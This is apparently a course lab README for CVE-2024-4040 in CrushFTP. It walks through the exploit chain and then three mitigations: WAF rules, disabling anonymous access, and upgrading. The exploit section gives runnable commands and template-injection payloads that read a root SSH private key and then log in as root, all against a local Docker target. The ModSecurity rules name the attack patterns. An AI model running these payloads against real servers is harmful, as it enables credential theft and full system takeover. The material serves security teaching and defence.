# CVE-2024-4040 — CrushFTP SSTI / LFI Proof of Concept

> **For educational and authorised lab use only.**  
> CS443 Software and Systems Security — controlled local Docker environment.

---

## Vulnerability Summary

| Field | Detail |
|---|---|
| **CVE** | CVE-2024-4040 |
| **Affected Software** | CrushFTP < 10.7.1 (v10 branch) / < 11.1.0 (v11 branch) |
| **Vulnerability Type** | Server-Side Template Injection (SSTI) → Unauthenticated Local File Read |
| **CVSS Score** | 9.8 Critical |
| **Impact** | Unauthenticated attackers can read arbitrary files from the server filesystem |

CrushFTP's `WebInterface` evaluates template expressions in the `path` parameter of the `zip` command without sanitisation. An unauthenticated attacker can obtain anonymous session cookies, then use those cookies to pass template payloads (`{working_dir}`, `<INCLUDE>…</INCLUDE>`) that the server evaluates and returns — allowing arbitrary file read across the host.

---

## Lab Environment

| Component | Value |
|---|---|
| Target | `http://localhost:8080` |
| Base PoC CrushFTP Version | 10.3.0 (intentionally vulnerable) |
| Mitigation 3 Test Environment | Separate container running CrushFTP 11.x (patched branch) |
| SSH Port (container) | `2222 → 22` |
| Admin Credentials | `admin / admin` |
| Container Runtime | Docker (Compose) |

---

## Prerequisites

```bash
pip install requests rich
```

---

## Scripts

| Script | Source | Purpose |
|---|---|---|
| `crushed.py` | [Stuub/CVE-2024-4040-SSTI-LFI-PoC](https://github.com/Stuub/CVE-2024-4040-SSTI-LFI-PoC) | Full SSTI/LFI exploit — session steal, arbitrary file read |
| `recon.py` | This repo | Version detection, live SSTI probe, vulnerability confirmation |

---

## Proof of Concept Walkthrough

### Step 1 — Start the Lab

```bash
docker-compose up -d
```

Wait ~10 seconds for CrushFTP to fully initialise before running the scripts.
No separate recon step is required here because `crushed.py` already checks whether exploitation is possible during execution.

---

### Step 2 — Steal SSH Private Key via LFI

```bash
python crushed.py -t http://localhost:8080 -l /root/.ssh/id_rsa
```

The script will:
1. Obtain an anonymous `CrushAuth` / `currentAuth` session from `/WebInterface/`
2. Use SSTI to confirm template evaluation and leak the server hostname
3. Use `{working_dir}` to resolve the CrushFTP installation directory
4. Use `<INCLUDE>/root/.ssh/id_rsa</INCLUDE>` to read the target file
5. Print the raw file contents to stdout

Copy the private key block from the output (everything from `-----BEGIN OPENSSH PRIVATE KEY-----` to `-----END OPENSSH PRIVATE KEY-----`).

---

### Step 3 — Save the Stolen Key

```bash
cat > stolen_id_rsa << 'EOF'
-----BEGIN OPENSSH PRIVATE KEY-----
<paste key from output>
-----END OPENSSH PRIVATE KEY-----
EOF

chmod 600 stolen_id_rsa
```

---

### Step 4 — SSH into the Container as Root

```bash
ssh -i stolen_id_rsa root@localhost -p 2222 -o StrictHostKeyChecking=no
```

---

### Step 5 — Confirm Root Access

```bash
whoami
# Expected: root

id
# Expected: uid=0(root) gid=0(root) groups=0(root)

hostname
# Expected: <container_id>
```

---

## Attack Chain Diagram

```
Unauthenticated attacker
        │
        ▼
GET /WebInterface/          ← obtains anonymous CrushAuth + currentAuth cookies
        │
        ▼
POST /WebInterface/function/
  ?command=zip
  &path={hostname}          ← SSTI confirmed — template evaluated by server
        │
        ▼
POST /WebInterface/function/
  ?command=zip
  &path={working_dir}       ← leaks absolute installation path
        │
        ▼
POST /WebInterface/function/
  ?command=zip
  &path=<INCLUDE>/root/.ssh/id_rsa</INCLUDE>   ← arbitrary file read
        │
        ▼
SSH -i stolen_id_rsa root@localhost -p 2222    ← full root shell
```

---

## Key Known Issues in crushed.py

| Issue | Location | Details |
|---|---|---|
| Missing dependency | Line 6–9 | Requires `pip install rich` before running |
| Brittle XML parsing | Lines 86, 140 | Crashes on non-XML server responses; no `ParseError` handling |
| Token regex too strict | Lines 160–161 | `CrushAuth=…; currentAuth=…` pattern may not match all `sessions.obj` formats |
| HTTP 404 only | Line 53 | Cookie grab only succeeds on 404; falls through silently on other status codes |

---

## Mitigation Strategies

### Mitigation 1 — Web Application Firewall (NGINX + ModSecurity)

#### Overview

A WAF acts as a reverse proxy that inspects incoming HTTP/S traffic before it reaches CrushFTP. Using NGINX with ModSecurity, malicious requests exploiting CVE-2024-4040 are blocked at the network edge without modifying CrushFTP itself.

#### How It Mitigates CVE-2024-4040

- Blocks path traversal patterns (for example, `../`, `%2e%2e`) in request URIs and cookies
- Prevents unauthenticated VFS escape requests from reaching CrushFTP
- Logs and denies suspicious payloads before they hit the application

#### Docker Setup

Add to `docker-compose.yaml`:

```yaml
version: '3'
services:
  crushftp:
    build: .
    expose:
      - "8080"
    networks:
      - crushnet

  nginx-waf:
    image: owasp/modsecurity-crs:nginx
    ports:
      - "80:80"
    environment:
      - BACKEND=http://crushftp:8080
      - PORT=80
    volumes:
      - ./nginx/waf.conf:/etc/modsecurity.d/setup.conf
    networks:
      - crushnet
    depends_on:
      - crushftp

networks:
  crushnet:
```

#### NGINX ModSecurity Rules

Create `nginx/waf.conf`:

```apache
# Enable ModSecurity WAF engine
SecRuleEngine On

# Block path traversal in URI (CVE-2024-4040 core pattern)
SecRule REQUEST_URI "@contains ../" \
        "id:1001,phase:1,deny,status:403,msg:'Path Traversal Attempt'"

# Block URL-encoded path traversal
SecRule REQUEST_URI "@contains %2e%2e" \
        "id:1002,phase:1,deny,status:403,msg:'Encoded Path Traversal'"

# Block path traversal in cookies
SecRule REQUEST_HEADERS:Cookie "@contains ../" \
        "id:1003,phase:1,deny,status:403,msg:'Path Traversal in Cookie'"

# Block exploit pattern targeting zip + INCLUDE on WebInterface/function
SecRule REQUEST_URI "@contains /WebInterface/function/" \
  "chain,id:1004,phase:1,deny,status:403,msg:'CrushFTP VFS Exploit Attempt'"
SecRule ARGS:command "@streq zip" \
  "chain"
SecRule ARGS:path "@contains INCLUDE"
```

#### Traffic Flow

```text
Attacker -> NGINX WAF (port 80) -> blocks malicious -> 403 Forbidden
                             -> forwards clean -> CrushFTP:8080
```

#### Limitations

- Does not patch the root cause - CrushFTP remains vulnerable if WAF is bypassed
- Requires rule updates as attackers develop obfuscation techniques

### Mitigation 2 — Disable Anonymous User Access

#### Overview

CVE-2024-4040 is exploitable without authentication. Disabling anonymous access forces all clients to authenticate, eliminating the unauthenticated attack vector entirely.

#### How It Mitigates CVE-2024-4040

- Exploit scripts like `crushed.py` rely on unauthenticated access - removing anonymous users breaks this flow
- All file access requests are tied to a verified identity
- Reduces the attack surface to authenticated users only

#### Implementation in CrushFTP

1. Log in to CrushFTP Web Admin at `http://localhost:8080`
2. Navigate to User Manager
3. Locate the anonymous user account
4. Delete or disable the account
5. Verify no VFS paths have guest/anonymous permissions

#### Verify via Docker

```bash
# Confirm anonymous login is rejected
curl -v -u "anonymous:" http://localhost:8080/WebInterface/function/?command=getUsername
# Expected: 401 Unauthorized
```

#### Limitations

- Does not patch the underlying vulnerability - authenticated users may still be at risk if exploit is adapted
- Organisations requiring public FTP access cannot fully disable anonymous access

### Mitigation 3 — Update to CrushFTP Version 11

#### Overview

Upgrading to CrushFTP 11 is the most effective and permanent fix. The patch adds strict input validation on VFS path resolution, eliminating the root cause of CVE-2024-4040.

#### How It Mitigates CVE-2024-4040

- Enforces strict sandboxing of VFS paths - escape attempts are rejected at the application level
- Exploit scripts such as `crushed.py` no longer work against version 11
- Fix is applied at source code level, not masked by external controls

#### Implementation

Update your `Dockerfile` to use CrushFTP 11:

```dockerfile
FROM eclipse-temurin:21-jdk-jammy
WORKDIR /var/opt

RUN apt-get update -y && apt-get -y install unzip wget openssh-server

COPY CrushFTP11.zip .
RUN unzip CrushFTP11.zip

EXPOSE 21
EXPOSE 8080
EXPOSE 443
EXPOSE 22

WORKDIR /var/opt/CrushFTP11
RUN java -Xmx1024m -jar CrushFTP.jar -a "admin" "admin"

CMD service ssh start && java -Xmx1024m -jar CrushFTP.jar -d
```

Rebuild the container:

```bash
docker-compose down --rmi all
docker-compose build --no-cache
docker-compose up -d
```

#### Verify the Patch Works

```bash
# Run the exploit against v11 - should fail
# Note: this repository's script uses -t/--target.
python3 crushed.py -t http://localhost:8080

# Expected: exploit returns no output or connection error
```
